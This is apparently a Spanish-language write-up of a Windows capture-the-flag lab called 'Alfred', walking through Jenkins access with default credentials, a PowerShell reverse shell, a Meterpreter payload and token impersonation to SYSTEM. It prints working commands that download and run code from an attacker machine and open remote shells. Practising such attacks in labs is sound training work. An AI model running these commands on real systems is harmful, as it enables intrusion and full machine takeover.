# Alfred

## 🖥️ Sistema

Windows

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Windows explotando una instancia de **Jenkins** accesible mediante credenciales por defecto, obtener acceso remoto al sistema mediante una **reverse shell en PowerShell** y escalar privilegios hasta **NT AUTHORITY\SYSTEM** aprovechando el privilegio **SeImpersonatePrivilege** mediante la extensión **Incognito** de Meterpreter.

---

## 🛠️ Tecnologías trabajadas

- Nmap
- Jenkins
- PowerShell
- Reverse Shell
- Meterpreter
- Metasploit
- msfvenom
- Incognito
- Windows Tokens
- SeImpersonatePrivilege

---

## 🧠 Metodología

La enumeración inicial reveló un sistema **Windows** gracias a la presencia del servicio **RDP**, además de dos aplicaciones web accesibles por los puertos **80** y **8080**.

Durante el reconocimiento web identifiqué una instancia de **Jenkins**, a la que fue posible acceder utilizando credenciales por defecto. Aprovechando la capacidad de Jenkins para ejecutar tareas del sistema, configuré un proyecto que ejecutaba comandos de PowerShell, obteniendo así una **reverse shell** sobre la máquina víctima.

Una vez dentro del sistema, preparé un payload de **Meterpreter** para disponer de funcionalidades avanzadas de post-explotación. La enumeración de privilegios reveló que el usuario comprometido disponía del privilegio **SeImpersonatePrivilege**, lo que permitió utilizar la extensión **Incognito** para suplantar un token privilegiado y obtener acceso como **NT AUTHORITY\SYSTEM**.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé realizando un escaneo con **Nmap**.

```bash
nmap -sC -sV -sT -Pn -v 10.129.166.115
```

Los servicios identificados fueron:

| Puerto | Servicio |
|---------|----------|
| 80 | HTTP |
| 3389 | RDP |
| 8080 | HTTP (Jenkins) |

La presencia del servicio **RDP** permitió identificar el sistema operativo como **Windows**.

---

### 2. Enumeración web

Accedí al servicio HTTP del puerto 80.

```text
http://10.129.166.115
```

La página mostraba una esquela dedicada a **Bruce Wayne**.

Durante la revisión del contenido encontré un correo electrónico de contacto.

```text
alfred@wayneenterprise.com
```

Este dato proporcionaba un posible usuario del entorno.

Posteriormente accedí al servicio del puerto **8080**.

```text
http://10.129.166.115:8080
```

Allí encontré un panel de autenticación correspondiente a:

```text
Jenkins
```

Probé las credenciales por defecto.

```text
Usuario: admin
Contraseña: admin
```

Las credenciales eran válidas y obtuve acceso al panel de administración.

---

### 3. Acceso inicial mediante Jenkins

El siguiente objetivo consistía en ejecutar comandos directamente sobre el sistema operativo.

Para ello creé un nuevo **Freestyle Project** y añadí un paso de construcción utilizando:

```text
Execute Windows batch command
```

Esto permitía ejecutar comandos del sistema desde Jenkins.

---

### 4. Obtención de una reverse shell

Preparé el script **Invoke-PowerShellTcp.ps1** en la máquina atacante y lo compartí mediante un servidor HTTP.

```bash
python3 -m http.server
```

Posteriormente añadí al proyecto de Jenkins el siguiente comando de PowerShell.

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.131.12:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.131.12 -Port 1234
```

Antes de ejecutar el proyecto preparé un listener.

```bash
nc -lvnp 1234
```

Al lanzar la tarea recibí una **reverse shell**.

Usuario obtenido:

```text
bruce
```

Con ello conseguí el acceso inicial al sistema.

---

### 5. Obtención de la flag de usuario

Accedí al escritorio del usuario.

```text
C:\Users\bruce\Desktop
```

Leí el archivo:

```text
user.txt
```

---

### 6. Preparación de Meterpreter

Para facilitar la post-explotación generé un payload con **msfvenom**.

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=192.168.131.12 LPORT=6666 -f exe -o shell.exe
```

Posteriormente descargué el ejecutable en la máquina víctima utilizando nuevamente Jenkins.

```powershell
powershell "(New-Object System.Net.WebClient).DownloadFile('http://192.168.131.12:8000/shell.exe','shell.exe')"
```

En la máquina atacante inicié **Metasploit** y configuré un handler.

```text
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.131.12
set LPORT 6666
run
```

Desde la shell previamente obtenida ejecuté el payload.

```powershell
.\shell.exe
```

Recibí una nueva sesión de **Meterpreter** y abrí una shell interactiva.

```text
shell
```

---

### 7. Enumeración de privilegios

Comprobé los privilegios disponibles.

```cmd
whoami /priv
```

Entre ellos destacaba:

```text
SeImpersonatePrivilege
```

Este privilegio permite suplantar tokens de usuarios con mayores privilegios.

---

### 8. Escalada de privilegios

Cargué la extensión **Incognito**.

```text
load incognito
```

Enumeré los tokens disponibles.

```text
list_tokens -g
```

Entre ellos apareció:

```text
BUILTIN\Administrators
```

Suplanté dicho token.

```text
impersonate_token "BUILTIN\Administrators"
```

Verifiqué el usuario actual.

```text
getuid
```

Resultado:

```text
NT AUTHORITY\SYSTEM
```

Para estabilizar la sesión migré a otro proceso.

```text
migrate 668
```

Con ello obtuve una sesión estable con privilegios de **SYSTEM**.

---

### 9. Obtención de la flag final

Con privilegios elevados accedí al escritorio del administrador.

```text
C:\Users\Administrator\Desktop
```

Leí el archivo:

```text
root.txt
```


---

## 📚 Lecciones aprendidas

- Este laboratorio permitió recorrer una cadena de explotación típica en entornos Windows, comenzando con la identificación de credenciales por defecto en una aplicación expuesta y finalizando con una escalada de privilegios mediante la suplantación de tokens.
- Identificar sistemas Windows mediante la enumeración de servicios.
- Reconocer una instancia de **Jenkins** expuesta.
- Aprovechar credenciales por defecto para obtener acceso administrativo.
- Ejecutar comandos del sistema desde proyectos **Freestyle** de Jenkins.
- Obtener una **reverse shell** utilizando PowerShell.
- Transferir archivos mediante PowerShell y servidores HTTP.
- Generar payloads personalizados con **msfvenom**.
- Gestionar sesiones **Meterpreter** para la post-explotación.
- Enumerar privilegios con `whoami /priv`.
- Comprender el funcionamiento de **SeImpersonatePrivilege**.
- Escalar privilegios utilizando la extensión **Incognito** y la suplantación de tokens.
- Estabilizar sesiones mediante la migración de procesos.
